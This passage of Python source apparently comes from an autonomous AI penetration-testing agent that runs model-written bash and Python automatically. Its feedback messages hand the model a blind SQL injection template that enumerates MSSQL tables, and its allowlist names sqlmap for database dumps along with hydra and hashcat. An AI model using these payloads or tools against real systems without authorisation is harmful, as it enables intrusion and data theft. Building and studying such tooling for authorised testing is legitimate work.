                            "ACTION: regenerate the same enumeration code. "
                            "bingo will fix the loop guard automatically."
                        )
                    )
                    self.console.print(f"[{THEME['warn']}]{_ilr_ov_title}[/]")
                    return f"[{_ilr_ov_title}]\n{_ilr_ov_body}"
                # ILR 1~2회차: 구체적 패턴 안내
                _fb_title = _s94.get("loop_block_feedback_title", "⛔ CODE BLOCK REJECTED — INFINITE LOOP PATTERN DETECTED")
                _fb_rewrite = _s94.get("loop_block_mandatory_rewrite", "MANDATORY REWRITE — Use cursor pagination:")
                _fb_now = _s94.get("loop_block_rewrite_now", "Rewrite with the cursor pagination pattern above NOW.")
                _hall_feedback = (
                    f"[{_fb_title}]\n"
                    + "\n".join(f"  Block #{j+1}: {m}" for j, m in enumerate(_hallucination_msgs))
                    + "\n\nYour enumeration loop will print the SAME table name forever!\n"
                    "ROOT CAUSE: SELECT TOP 1 without cursor + no seen=set()\n\n"
                    f"{_fb_rewrite}\n"
                    "  seen = set()\n"
                    "  last_hex = ''\n"
                    "  while True:\n"
                    "      cursor_clause = f' AND name > {last_hex}' if last_hex else ''\n"
                    "      payload = f\"AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55{cursor_clause})\"\n"
                    "      result = extract_char_by_char(payload)  # your existing extract fn\n"
                    "      if not result or result in seen:\n"
                    "          break\n"
                    "      seen.add(result)\n"
                    "      last_hex = '0x' + result.encode().hex().upper()\n"
                    "      print(result)\n\n"
                    "DO NOT use: for i in range(N): query('SELECT TOP 1 name ... LIKE ...')\n"
                    f"{_fb_now}"
                )

            elif _has_loop_block:
                # v3.2.91: 연속 LOOP_BLOCK 카운터 — 무한 재시도 사이클 방지
                self._loop_block_consecutive += 1
                _MAX_LOOP_BLOCK = 2
                if self._loop_block_consecutive > _MAX_LOOP_BLOCK:
                    # 루프 카운터 초기화 후 강제 탈출 메시지 반환
                    self._loop_block_consecutive = 0
                    _lang = getattr(self.config, "lang", "en")
                    _n = _MAX_LOOP_BLOCK + 1
                    _s91 = get_strings(_lang)
                    _esc_title_tpl = _s91.get("loop_block_escape_title", f"⚠ LOOP_BLOCK {_n}x consecutive — switch pattern")
                    _esc_title = _esc_title_tpl.replace("{n}", str(_n))
                    _esc_body = _s91.get("loop_block_escape_body", (
                        "The same loop pattern keeps getting blocked. Try a different enumeration strategy:\n"
                        "  1) seen=set() + while True + cursor-based (name > last_hex)\n"
                        "  2) OFFSET N pagination\n"
                        "  3) NOT IN (already_found) subquery\n"
                        "Rewrite code with one of these strategies NOW."
                    ))
                    _esc_msg = f"[{_esc_title}]\n{_esc_body}"
                    self.console.print(f"[{THEME['warn']}]{_esc_title}[/]")
                    return _esc_msg
                _s91b = get_strings(getattr(self.config, "lang", "en"))
                _fb_title = _s91b.get("loop_block_feedback_title", "⛔ CODE BLOCK REJECTED — INFINITE LOOP PATTERN DETECTED")
                _fb_rewrite = _s91b.get("loop_block_mandatory_rewrite", "MANDATORY REWRITE — Use cursor pagination:")
                _fb_now = _s91b.get("loop_block_rewrite_now", "Rewrite with the cursor pagination pattern above NOW.")
                _hall_feedback = (
                    f"[{_fb_title}]\n"
                    + "\n".join(f"  Block #{j+1}: {m}" for j, m in enumerate(_hallucination_msgs))
                    + "\n\nYour enumeration loop will print the SAME table name forever!\n"
                    "ROOT CAUSE: SELECT TOP 1 without cursor + no seen=set()\n\n"
                    f"{_fb_rewrite}\n"
                    "  seen = set()\n"
                    "  last_hex = ''\n"
                    "  while True:\n"
                    "      cursor_clause = f' AND name > {last_hex}' if last_hex else ''\n"
                    "      payload = f\"AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55{cursor_clause})\"\n"
                    "      result = extract_char_by_char(payload)  # your existing extract fn\n"
                    "      if not result or result in seen:\n"
                    "          break\n"
                    "      seen.add(result)\n"
                    "      last_hex = '0x' + result.encode().hex().upper()\n"
                    "      print(result)\n\n"
                    "DO NOT use: for i in range(N): query('SELECT TOP 1 name ... LIKE ...')\n"
                    f"{_fb_now}"
                )
            else:
                # v4.9.5: bash/curl 방식으로 재작성 유도
                _hall_feedback = (
                    "[⛔ ALL CODE BLOCKS REJECTED — HALLUCINATION DETECTED]\n"
                    + "\n".join(f"  Block #{j+1}: {m}" for j, m in enumerate(_hallucination_msgs))
                    + "\n\nYou MUST rewrite as a bash block with real curl:\n\n"
                    "```bash\n"
                    "curl -s -m 10 -k \\\n"
                    "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \\\n"
                    "  'https://TARGET/path' \\\n"
                    "  | /usr/bin/python3 -c \"\n"
                    "import sys\n"
                    "d=sys.stdin.buffer.read()\n"
                    "t=d.decode('utf-8',errors='replace')\n"
                    "print(f'[STATUS] {len(d)}B')\n"
                    "print(t[:1500])\n"
                    "\"\n"
                    "```\n"
                    "Use runnable bash+curl or TOOL_CALL run_python. Do not return fake JSON results."
                )
            return [_hall_feedback]

        # ── v5.1.7: 스크립트 전처리 — curl 타임아웃 자동 주입 ─────────────────────────
        def _sanitize_script(src: str) -> str:
            """bash 스크립트 실행 BEFORE 전처리:
            1. 모든 `curl` 에 -m 30 --connect-timeout 10 자동 주입 (이미 있으면 건드리지 않음)
            2. `while true` 루프에 _BINGO_CNT 카운터 삽입 (무한 루프 방지)

            목적: 스크립트 자체가 자기 제한 시간 내 종료 → watchdog은 진짜 마지막 방어선.
            """
            import re as _re
            import platform as _plt

            lines_out: list[str] = []
            _in_while_true = False
            _is_macos = _plt.system() == "Darwin"

            for _ln in src.split("\n"):
                _stripped = _ln.rstrip()

                # ── (0) macOS: grep -P → grep -E (BSD grep는 -P 미지원) ──
                if _is_macos and not _stripped.lstrip().startswith("#"):
                    if "grep" in _stripped:
                        # 단독 플래그: grep -P "..." → grep -E "..."
                        _stripped = _re.sub(r'(\bgrep\s+)-P\b', r'\1-E', _stripped)
                        # 복합 플래그: grep -nP / grep -Po / grep -Pn 등
                        _stripped = _re.sub(
                            r'(\bgrep\s+-[a-zA-Z]*)P([a-zA-Z]*)',
                            lambda m: f'{m.group(1)}E{m.group(2)}',
                            _stripped,
                        )

                # ── (1) curl 타임아웃 주입 ──────────────────────────
                # 주석 줄 / echo 줄은 건드리지 않음
                _is_comment = _stripped.lstrip().startswith("#")
                _is_echo    = bool(_re.match(r'^\s*echo\b', _stripped))
                if not _is_comment and not _is_echo and _re.search(r'\bcurl\b', _stripped):
                    # -m / --max-time 없는 경우만 주입
                    if "-m " not in _stripped and "--max-time" not in _stripped:
                        _stripped = _re.sub(
                            r'\bcurl\b',
                            "curl -m 30 --connect-timeout 10",
                            _stripped,
                            count=1,
                        )

                # ── (2) while true 루프에 카운터 삽입 ──────────────
                # `while true; do` 또는 `while true` 단독 줄 감지
                _wt_match = _re.match(
                    r'^(\s*)while\s+true\s*(?:;\s*do|$)', _stripped
                )
                if _wt_match and not _is_comment:
                    _indent = _wt_match.group(1)
                    # 카운터 초기화 줄을 while 앞에 삽입
                    lines_out.append(f"{_indent}_BINGO_CNT=0")
                    # while 줄 자체 유지 (세미콜론 형식으로 통일)
                    _stripped = _re.sub(
                        r'\bwhile\s+true\s*(?:;\s*do)?',
                        "while true; do",
                        _stripped,
                        count=1,
                    )
                    lines_out.append(_stripped)
                    # do 다음 줄에 카운터 증가+브레이크 삽입
                    _ci = _indent + "  "
                    lines_out.append(
                        f"{_ci}_BINGO_CNT=$((_BINGO_CNT+1)); "
                        f"[ \"$_BINGO_CNT\" -gt 200 ] && "
                        f"{{ echo '[BINGO] loop safety limit reached'; break; }}"
                    )
                    continue

                lines_out.append(_stripped)

            return "\n".join(lines_out)

        # v3.2.91/94: 정상 코드 실행 경로 → 연속 카운터 리셋
        self._loop_block_consecutive = 0
        self._ilr_consecutive = 0   # v3.2.94: ILR 카운터도 리셋
        self._ilr_override = False  # v3.2.94: override 잔류 플래그 클리어

        # ── v4.9.5: bash 블록 → .sh 파일 저장 후 실행 (multi-line curl+python3 지원) ──
        bash_blocks = re.findall(r"```(?:bash|sh)\s*(.*?)```", response, re.DOTALL)

        def _repair_python_regex_quotes(source: str) -> str:
            """Use triple quotes for generated raw regexes containing quote classes.

            Handles model-generated Python embedded in Bash heredocs, including
            raw bytes literals such as:
              re.search(rb'charset[=]\\s*[\\"']?([\\w-]+)', head)
            """
            import re as _rx_quote

            _regex_call = _rx_quote.compile(
                r'\bre\.(?:findall|finditer|search|match|compile|sub|split)\s*\('
            )
            _raw_prefixes = ("rb'", "br'", "r'")

            def _needs_repair(pattern: str) -> bool:
                return any(token in pattern for token in (
                    '["\']', '[\'"]', '[^"\']', '[^\'"]',
                    '[\\"\\\']', '[\\\'\\"]', '[\\"\'',
                ))

            def _repair_line(line: str) -> str:
                if "re." not in line or not _regex_call.search(line):
                    return line
                if not any(prefix in line for prefix in _raw_prefixes):
                    return line

                out: list[str] = []
                i = 0
                changed = False
                while i < len(line):
                    candidates = [
                        (line.find(prefix, i), prefix)
                        for prefix in _raw_prefixes
                        if line.find(prefix, i) >= 0
                    ]
                    if not candidates:
                        out.append(line[i:])
                        break
                    start, prefix = min(candidates, key=lambda item: item[0])
                    out.append(line[i:start])
                    j = start + len(prefix)
                    in_class = False
                    escaped = False
                    end = -1
                    while j < len(line):
                        ch = line[j]
                        if escaped:
                            escaped = False
                        elif ch == "\\":
                            escaped = True
                        elif ch == "[":
                            in_class = True
                        elif ch == "]":
                            in_class = False
                        elif ch == "'" and not in_class:
                            k = j + 1
                            while k < len(line) and line[k].isspace():
                                k += 1
                            if k >= len(line) or line[k] in ",)":
                                end = j
                                break
                        j += 1

                    if end < 0:
                        out.append(line[start:])
                        break

                    pattern = line[start + len(prefix):end]
                    if _needs_repair(pattern) and "'''" not in pattern:
                        out.append(prefix[:-1] + "'''" + pattern + "'''")
                        changed = True
                    else:
                        out.append(line[start:end + 1])
                    i = end + 1
                return "".join(out) if changed else line

            repaired_lines: list[str] = []
            for line in source.splitlines():
                repaired_lines.append(_repair_line(line))
            return "\n".join(repaired_lines)

        _BASH_ALLOWED = {
            # HTTP / 스캔
            "curl", "nmap", "nikto", "ffuf", "gobuster", "nuclei",
            "httpx", "subfinder", "amass", "whatweb",
            # SQLi / 익스플로잇 [v5.1.8: sqlmap, ghauri 추가 — DB 덤프용]
            "sqlmap", "ghauri",
            # 브루트포스
            "hydra", "medusa", "wfuzz", "wpscan",
            # WAF 탐지
            "wafw00f",
            # 크랙
            "john", "hashcat",
            # Python (로컬 처리)
            "python3", "python",
        }
        history_text = " ".join(m.content for m in self.history if m.role == "user")
        import shlex as _shlex_bash
        for _bash_i, block in enumerate(bash_blocks):
            script = _repair_python_regex_quotes(block.strip())
            script, _mixed_python_fixed = _repair_mixed_bash_python(script)
            if not script:
                continue
            # 첫 번째 실행 명령 추출 (파이프 앞 부분, 주석 제외)
            first_real_lines = [
                l.strip() for l in script.splitlines()
                if l.strip() and not l.strip().startswith("#")
            ]
            if not first_real_lines:
                continue
            # 파이프 / && 앞 첫 명령어만 추출하여 allowlist 검사
            _first_cmd_raw = first_real_lines[0].split("|")[0].split("&&")[0].strip()
            _first_cmd_raw = _first_cmd_raw.replace("\\\n", " ").rstrip("\\").strip()
            try:
                _first_parts = _shlex_bash.split(_first_cmd_raw)
            except Exception:
                _first_parts = _first_cmd_raw.split()
            if not _first_parts:
                continue
            _bin_name = _first_parts[0].split("/")[-1]
            if _bin_name not in _BASH_ALLOWED:
                continue
            # 중복 실행 방지
            _dedup_key = script[:60]
            if f"REAL EXECUTION: {_dedup_key[:40]}" in history_text:
                continue
            # ── bash 환각 감지 ──
            _bash_hall = _detect_hallucination(script, _block_type="bash")
            if _bash_hall:
                self.console.print(
                    f"[{THEME['error']}]⛔ [BASH HALLUCINATION #{_bash_i+1}] {_bash_hall[:120]}[/]"
                )
                _hallucination_msgs.append(_bash_hall)
                continue
            # ── v6.2.13: bash 블록 내 독립 Python 문 감지 및 제거 ───────────────
            # AI가 bash 블록 최상위에 'import sys, json' 같은 Python 구문을 혼용하는 버그 방지
            # 단, python3 -c "..." 내부 또는 heredoc(python3 << 'PYEOF') 내부는 제거 안 함
            _PY_ONLY_RE = re.compile(
                r'^(?:import\s+\S|from\s+\S+\s+import\s|def\s+\w+\s*\(|class\s+\w+[\s:(])'
            )
            _PY3_OPEN_RE = re.compile(r'\bpython3?\s+-c\s+(["\'])')
            # v6.2.19: heredoc 감지 (python3 << 'EOF' / python3 << "EOF" / python3 <<'EOF')
            _HEREDOC_OPEN_RE = re.compile(r'\bpython3?\s+<<\s*[\'"]?(\w+)[\'"]?\s*$')
            _in_py3_c = False       # python3 -c "..." 내부 여부
            _py3_quote = None
            _in_heredoc = False     # python3 << 'PYEOF' 내부 여부
            _heredoc_end = None     # heredoc 종료 마커
            _cleaned_lines = []
            _removed_any = False
            for _bline in script.splitlines():
                _bstripped = _bline.strip()
                # heredoc 내부 → Python 코드 그대로 보존
                if _in_heredoc:
                    _cleaned_lines.append(_bline)
                    if _bstripped == _heredoc_end:
                        _in_heredoc = False
                        _heredoc_end = None
                    continue
                # python3 -c 내부 → 그대로 보존
                if _in_py3_c:
                    _cleaned_lines.append(_bline)
                    if _bstripped in (_py3_quote, _py3_quote + ';'):
                        _in_py3_c = False
                        _py3_quote = None
                    continue
                # heredoc 열기 감지
                _hm = _HEREDOC_OPEN_RE.search(_bline)
                if _hm:
                    _in_heredoc = True
                    _heredoc_end = _hm.group(1)
                    _cleaned_lines.append(_bline)
                    continue
                # python3 -c "..." 열기 감지
                _open_m = _PY3_OPEN_RE.search(_bline)
                if _open_m:
                    _q = _open_m.group(1)
                    _rest = _bline[_open_m.end():]
                    if _q not in _rest:
                        _in_py3_c = True
                        _py3_quote = _q
                    _cleaned_lines.append(_bline)
                    continue
                # 최상위 bash 레벨에서만 Python 전용 구문 제거
                if _bstripped and _PY_ONLY_RE.match(_bstripped):
                    _removed_any = True
                    continue
                _cleaned_lines.append(_bline)
            if _removed_any:
                script = '\n'.join(_cleaned_lines).strip()
                if not script:
                    continue
            # Use the same quote-aware repair path as TOOL_CALL run_bash.
            # This converts multiline python -c blocks to heredoc/tempfiles and
            # preserves curl pipeline stdin before bash syntax preflight.
            from ..tools_ext.pentest_tools import _fix_bash_script
            script = _fix_bash_script(script)
            # ── v5.1.7: 스크립트 전처리 (curl 타임아웃 + while 카운터 자동 주입) ──
            script = _sanitize_script(script)
            _bash_check = subprocess.run(
                ["bash", "-n"],
                input=script,
                text=True,
                capture_output=True,
                check=False,
            )
            if _bash_check.returncode != 0:
                _syntax_detail = (_bash_check.stderr or "bash syntax error").strip()[:240]
                _hallucination_msgs.append(
                    f"BASH_SYNTAX_PREFLIGHT_FAILED: {_syntax_detail}. "
                    "Use TOOL_CALL run_python for HTML/regex parsing."
                )
                continue
            # ── multi-line .sh 파일로 저장 ──
            _sh_path = tmp_dir / f"agent_bash_{len(tasks)}.sh"
            _sh_path.write_text(script, encoding="utf-8")
            _sh_path.chmod(0o755)
            tasks.append({
                "type": "bash",
                "path": str(_sh_path),
                "cmd": first_real_lines[0][:80],   # 표시용 1줄 요약
                "preview": script[:120],
                "code": script[:16_384],
            })

        # ── v6.2.0: Python 블록 파싱 및 tasks 추가 ──────────────────────────────
        def _fix_indent(code: str) -> str:
            """IndentationError 자동 교정 v6.2.10 (terminal.py 인라인 버전).
            try:/if:/for:/def:/class: 뒤 잘못된 들여쓰기 자동 수정."""
            import ast as _ast, textwrap as _tw, re as _re
            def _ok(c):
                try: _ast.parse(c); return True
                except: return False
            if _ok(code): return code
            # Step 1: dedent
            d = _tw.dedent(code)
            if _ok(d): return d
            # Step 2: 탭 → 4-space
            tab_fixed = _re.sub(r'^\t+', lambda m: '    ' * len(m.group()), d, flags=_re.MULTILINE)
            if _ok(tab_fixed): return tab_fixed
            # Step 3: 콜론으로 끝나는 줄 다음에 들여쓰기 없으면 pass 삽입
            lines = tab_fixed.splitlines()
            fixed = []
            for i, line in enumerate(lines):
                fixed.append(line)
                stripped = line.rstrip()
                if stripped.endswith(':') and stripped.lstrip() and not stripped.lstrip().startswith('#'):
                    indent_lvl = len(line) - len(line.lstrip())
                    next_line = lines[i + 1] if i + 1 < len(lines) else ""
                    next_indent = len(next_line) - len(next_line.lstrip()) if next_line.strip() else 0
                    if next_indent <= indent_lvl and next_line.strip():
                        fixed.append(' ' * (indent_lvl + 4) + 'pass')
            pass_fixed = '\n'.join(fixed)
            if _ok(pass_fixed): return pass_fixed
            # Step 4: try: 블록에 except/finally 없는 경우 → except Exception: pass 자동 삽입
            # v6.2.25: "SyntaxError: expected 'except' or 'finally' block" 자동 보완
            _s4 = pass_fixed
            for _ in range(10):
                try:
                    _ast.parse(_s4)
                    return _s4
                except SyntaxError as _e4:
                    if "expected 'except' or 'finally'" not in str(_e4):
                        break
                    _ln4 = getattr(_e4, 'lineno', 0)
                    if not _ln4:
                        break
                    _ls4 = _s4.splitlines()
                    _el4 = _ln4 - 1
                    if not (0 <= _el4 < len(_ls4)):
                        break
                    # v6.2.41 FIX: 에러 라인 대신 가장 가까운 try: 의 들여쓰기 사용
                    _try_i4 = -1
                    for _k4 in range(_el4 - 1, max(-1, _el4 - 200), -1):
                        if _k4 < len(_ls4) and _re.search(r'^\s*try\s*:', _ls4[_k4]):
                            _try_i4 = _k4
                            break
                    if _try_i4 >= 0:
                        _ts4 = _ls4[_try_i4]
                        _ind4 = len(_ts4) - len(_ts4.lstrip())
                    else:
                        _tl4 = _ls4[_el4]
                        _ind4 = len(_tl4) - len(_tl4.lstrip()) if _tl4.strip() else 0
                    _ls4.insert(_el4, ' ' * _ind4 + 'except Exception:')
                    _ls4.insert(_el4 + 1, ' ' * (_ind4 + 4) + 'pass')
                    _s4 = '\n'.join(_ls4)
            if _ok(_s4): return _s4
            return code

        def _inject_missing_codeblock_imports(code: str) -> str:
            """Add common missing stdlib imports before markdown Python execution."""
            import re as _imp_re
            rules = [
                ("re", r'\bre\.'),
                ("json", r'\bjson\.'),
                ("time", r'\btime\.'),
                ("random", r'\brandom\.'),
                ("string", r'\bstring\.'),
                ("os", r'\bos\.'),
                ("sys", r'\bsys\.'),
                ("base64", r'\bbase64\.'),
                ("hashlib", r'\bhashlib\.'),
                ("urllib.parse", r'\burllib\.parse\.'),
            ]
            existing = set(_imp_re.findall(r'(?m)^\s*(?:import|from)\s+([A-Za-z_][\w.]*)', code))
            to_add: list[str] = []
            for module, pattern in rules:
                root = module.split(".", 1)[0]
                if module in existing or root in existing:
                    continue
                if _imp_re.search(pattern, code):
                    to_add.append(f"import {module}")
            if not to_add:
                return code
            lines = code.splitlines()
            insert_at = 0
            for idx, line in enumerate(lines[:20]):
                stripped = line.strip()
                if not stripped or stripped.startswith("#") or stripped.startswith("from __future__"):
                    insert_at = idx + 1
                    continue
                if stripped.startswith("import ") or stripped.startswith("from "):
                    insert_at = idx + 1
                    continue
                break
            for stmt in reversed(to_add):
                lines.insert(insert_at, stmt)
            return "\n".join(lines)

        python_raw_blocks = re.findall(r"```python\s*(.*?)```", response, re.DOTALL)
        for _py_i, py_block in enumerate(python_raw_blocks):
            py_script = _inject_missing_codeblock_imports(
                _fix_indent(_repair_python_regex_quotes(py_block.strip()))
            )
            if not py_script:
                continue
            _py_hall = _detect_hallucination(py_script, _block_type="python")
            if _py_hall:
                _hallucination_msgs.append(_py_hall)
                continue
            try:
                import ast as _py_ast
                _py_ast.parse(py_script)
            except SyntaxError as _py_syn:
                _hallucination_msgs.append(
                    f"PYTHON_SYNTAX_PREFLIGHT_FAILED: line {_py_syn.lineno}: {_py_syn.msg}. "
                    "Regenerate as canonical TOOL_CALL run_python with concrete target values; "
                    "do not output placeholder/template code blocks."
                )
                continue
            _py_dedup_key = py_script[:60]
            if f"PYTHON EXECUTION" in history_text and _py_dedup_key[:40] in history_text:
                continue
            _py_path = tmp_dir / f"agent_python_{len(tasks)}.py"
            _py_path.write_text(py_script, encoding="utf-8")
            first_py_line = next((l.strip() for l in py_script.splitlines() if l.strip() and not l.strip().startswith("#")), py_script[:80])
            tasks.append({
                "type": "python",
                "path": str(_py_path),
                "idx": _py_i,
                "cmd": first_py_line[:80],
                "preview": py_script[:120],
                "code": py_script[:16_384],
            })

        if not tasks:
            if _hallucination_msgs:
                return [
                    "[INTERNAL_AUTO_REPAIR_REQUIRED]\n"
                    + "\n".join(_hallucination_msgs)
                    + "\nRegenerate the operation as canonical TOOL_CALL run_python or valid Bash. "
                    "Do not explain the correction and do not repeat the malformed block."
                ]
            return []

        # ── 병렬 실행 ────────────────────────────────────────────────
        results_text: list[str] = [""] * len(tasks)
        _lock = threading.Lock()
        _SCRIPT_TIMEOUT, _IDLE_TIMEOUT, _WALL_CLOCK_MAX = _codeblock_exec_limits()

        def _run_task(task: dict, slot: int) -> None:
            try:
                # v6.2.0: Python/bash 모두 실행
                if task["type"] == "python":
                    _py_cmd = ["python3", task["path"]]
                    proc = subprocess.Popen(
                        _py_cmd,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        start_new_session=True,
                    )
                    stdout, stderr = proc.communicate()
                    output = (stdout.decode("utf-8", "replace") + stderr.decode("utf-8", "replace"))
                    if output.strip():
                        preview_out = "\n".join(output.strip().splitlines()[:50])
                        with _lock:
                            self.console.print(f"[{THEME['dim']}]{_resc(preview_out)}[/]")
                        results_text[slot] = (
                            f"=== PYTHON EXECUTION: script_{task.get('idx', slot)} ===\n"
                            f"{output.strip()}\n=== EXIT CODE: {proc.returncode} ==="
                        )
                    else:
                        results_text[slot] = (
                            f"=== PYTHON EXECUTION: script_{task.get('idx', slot)} ===\n"
                            f"(no output, exit code {proc.returncode})"
                        )
                    return

                else:  # bash — v4.9.5~: .sh 파일로 실행 (multi-line curl+python3 지원)
                    with _lock:
                        self.console.print(
                            f"\n[{THEME['secondary']}]▶ {self.s['exec_running']}:[/] "
                            f"[{THEME['dim']}]{task['cmd'][:100]}[/]"
                        )
                    _bash_cmd = ["bash", task["path"]] if task.get("path") else task["cmd"]
                    proc = subprocess.Popen(
                        _bash_cmd,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        start_new_session=True,
                    )
                    stdout, stderr = proc.communicate()
                    output = (stdout.decode("utf-8", "replace") + stderr.decode("utf-8", "replace"))
                    if output.strip():
                        preview_out = "\n".join(output.strip().splitlines()[:50])
                        with _lock:
                            self.console.print(f"[{THEME['dim']}]{_resc(preview_out)}[/]")
                        results_text[slot] = (
                            f"=== REAL EXECUTION: {task['cmd'][:80]} ===\n"
                            f"{output.strip()}\n=== EXIT CODE: {proc.returncode} ==="
                        )
                    else:
                        results_text[slot] = (
                            f"=== REAL EXECUTION: {task['cmd'][:80]} ===\n"
                            f"(no output, exit code {proc.returncode})"
                        )
            except Exception as e:
                _err_msg = str(e)
                # v6.2.20: I/O on closed file → console이 닫힌 후 스레드 실행 시 발생, 무시
                if "closed file" not in _err_msg and "I/O operation" not in _err_msg:
                    try:
                        with _lock:
                            self.console.print(f"[{THEME['error']}]  exec error:[/] {_resc(_err_msg)}")
                    except Exception:
                        pass
                results_text[slot] = f"=== EXEC ERROR: {_err_msg} ==="

        # 프로세스 객체 저장 (소프트 타임아웃 시 종료용)
        procs: list = []
        _orig_run_task = _run_task

        proc_list_lock = threading.Lock()
        proc_registry: list = []

        def _tracked_run_task(task: dict, slot: int) -> None:
            """실시간 stdout 스트리밍 — print() 출력 즉시 화면에 표시."""
            try:
                env = {**os.environ, "PYTHONIOENCODING": "utf-8", "PYTHONUNBUFFERED": "1"}
                if task["type"] == "python":
                    p = subprocess.Popen(
                        ["python3", "-u", task["path"]],  # -u: unbuffered
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        env=env, bufsize=0,
                        start_new_session=True,  # v3.2.99: WSL/VM Ctrl+C 격리
                    )
                else:  # bash — v4.9.5: .sh 파일로 실행 (multi-line 유지)
                    _bash_exec = ["bash", task["path"]] if task.get("path") else task["cmd"]
                    p = subprocess.Popen(
                        _bash_exec,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        env=env, bufsize=0,
                        start_new_session=True,
                    )
                with proc_list_lock:
                    proc_registry.append(p)

                label = f"script_{task.get('idx', slot)}" if task["type"] == "python" else task["cmd"][:80]
                prefix = "PYTHON EXECUTION" if task["type"] == "python" else "REAL EXECUTION"
                all_lines: list[str] = []
                # v3.2.23: 실시간 Traceback 스트리밍 필터 상태
                _tb_buf: list[str] = []
                _in_tb = False

                # 실시간 라인 스트리밍 — 중복 감지 + 타임아웃
                _consec_count = 0
                _last_stripped = None
                _killed_reason: str | None = None
                _start_ts = __import__("time").time()
                _last_output_ts = _start_ts
                task["started_ts"] = _start_ts
                task["last_output_ts"] = _last_output_ts
                _MAX_CONSEC_DUP = 100   # 동일 줄 100회 연속 → 루프 감지 [v3.2.54: 오탐 방지 강화]
                _MAX_CONSEC_SCAN = 500  # 스캔 결과 줄은 500회까지 허용 (XSS 반사 등)
                # 합법적 반복이 발생하는 스캔 결과 prefix — 더 높은 임계값 적용
                _SCAN_OUTPUT_MARKERS: tuple[str, ...] = (
                    # XSS 반사 위치
                    "反射位置:", "반사 위치:", "Reflection at:", "반射位置:",
                    # 발견/취약점 결과
                    "발견:", "Found:", "发现:", "탐지:", "Detected:",
                    "취약:", "Vulnerable:", "漏洞:", "CVE-",
                    # 스캔 진행 상태
                    "[+]", "[-]", "[*]", "[!]",
                    # 파라미터/엔드포인트 열거
                    "  →", "  -", "  ✅", "  ❌", "  ⚠",
                )

                def _is_scan_result_line(s: str) -> bool:
                    """스캔 결과 라인이면 True — 높은 반복 임계값 사용."""
                    t = s.strip()
                    # HTML 태그 라인 (<input>, <br>, <td>, <li> 등)은 페이지 분석 시
                    # 속성 없는 태그가 연속으로 출력될 수 있음 — 무한루프 아님
                    if t.startswith("<") and t.endswith(">"):
                        return True
                    return any(t.startswith(m.strip()) for m in _SCAN_OUTPUT_MARKERS)

                # ── 하드 워치독: stdout 출력 없는 블로킹(pymssql 등)도 강제 종료 ──
                _watchdog_fired = threading.Event()

                def _kill_process_group(proc: subprocess.Popen) -> None:
                    import os as _wd_os
                    import signal as _wd_sig
                    try:
                        pgid = _wd_os.getpgid(proc.pid)
                        _wd_os.killpg(pgid, _wd_sig.SIGKILL)
                    except Exception:
                        try:
                            proc.kill()
                        except Exception:
                            pass
                    # stdout 파이프 강제 닫기 — 자식 프로세스 잔존 시 readline 해제
                    try:
                        proc.stdout.close()
                    except Exception:
                        pass

                def _hard_watchdog(proc: subprocess.Popen, fired: threading.Event) -> None:
                    """stdout 스트림에 관계없이 timeout/idle 이후 프로세스 그룹 전체를 강제 종료.
                    v5.1.6: proc.kill() → os.killpg() — bash 자식 프로세스(curl 등) 고아 방지.
                    proc.kill()은 bash만 종료하고 자식 curl 프로세스가 stdout 파이프를
                    유지해 스레드가 종료되지 않는 버그 수정."""
                    nonlocal _killed_reason
                    import time as _wd_time
                    while not fired.wait(timeout=0.5):
                        now = _wd_time.time()
                        reason: str | None = None
                        if now - _start_ts >= _SCRIPT_TIMEOUT:
                            reason = f"TIMEOUT_{_SCRIPT_TIMEOUT}s"
                        elif _IDLE_TIMEOUT > 0 and now - _last_output_ts >= _IDLE_TIMEOUT:
                            reason = f"IDLE_TIMEOUT_{_IDLE_TIMEOUT}s"
                        if reason:
                            _killed_reason = reason
                            task["killed_reason"] = reason
                            _kill_process_group(proc)
                            return

                _watchdog_th = threading.Thread(
                    target=_hard_watchdog,
                    args=(p, _watchdog_fired),
                    daemon=True,
                )
                _watchdog_th.start()

                def _mark_output_activity() -> None:
                    nonlocal _last_output_ts
                    _last_output_ts = __import__("time").time()
                    task["last_output_ts"] = _last_output_ts

                def _flush_tb_compressed(n_buf: int) -> None:
                    """v3.2.23: 버퍼링된 Traceback 블록을 1줄로 압축 출력."""
                    nonlocal _in_tb
                    if not _tb_buf:
                        _in_tb = False
                        return
                    exc_line = None
                    for _bl in reversed(_tb_buf):
                        _bls = _bl.strip()
                        if (
                            _bls
                            and not _bl[0].isspace()
                            and _bls != "Traceback (most recent call last):"
                            and ":" in _bls
                        ):
                            exc_line = _bls
                            break
                    _compressed = (
                        f"[错误] {exc_line}" if exc_line
                        else f"[错误] (traceback {n_buf}L)"
                    )
                    all_lines.append(_compressed)
                    with _lock:
                        try:
                            self.console.print(f"[{THEME['dim']}]{_resc(_compressed)}[/]")
                        except Exception:
                            self.console.out(_compressed)
                    _tb_note = t(
                        "traceback_stream_compressed",
                        f"📦 [EXEC] Traceback {n_buf}줄 → 실시간 압축",
                    ).replace("{n}", str(n_buf))
                    with _lock:
                        self.console.print(f"[{THEME['dim']}]{_tb_note}[/]")
                    _tb_buf.clear()
                    _in_tb = False

                # v3.2.25: Python 연쇄 예외(chained exception) 구분 메시지 — 무음 억제
                _CHAINED_EXC_MSGS: frozenset[str] = frozenset({
                    "The above exception was the direct cause of the following exception:",
                    "During handling of the above exception, another exception occurred:",
                })

                # ── v5.2.7: 스마트 터미널 출력 필터 (렉 방지) ──
                # AI 컨텍스트(all_lines)에는 모든 내용 전달, 화면엔 핵심만 표시
                import re as _re  # noqa: F811 — 로컬 임포트 (스코프 내 re 별칭)
                _disp_html_run: int = 0        # 연속 HTML 태그 줄 수
                _disp_hdr_run:  int = 0        # 연속 HTTP 헤더 줄 수
                _disp_suppressed: int = 0      # 억제된 줄 수 (알림용)
                _MAX_HTML_RUN   = 3            # HTML 줄 최대 3줄까지 표시
                _MAX_HDR_RUN    = 7            # HTTP 헤더 최대 7줄까지 표시
                _MAX_LINE_DISP  = 220          # 긴 줄은 220자로 잘라서 표시

                # HTML 태그 감지
                _HTML_TAG_PAT = _re.compile(r'<[a-zA-Z/!]')
                # HTTP 헤더 줄 감지: "Key: value"
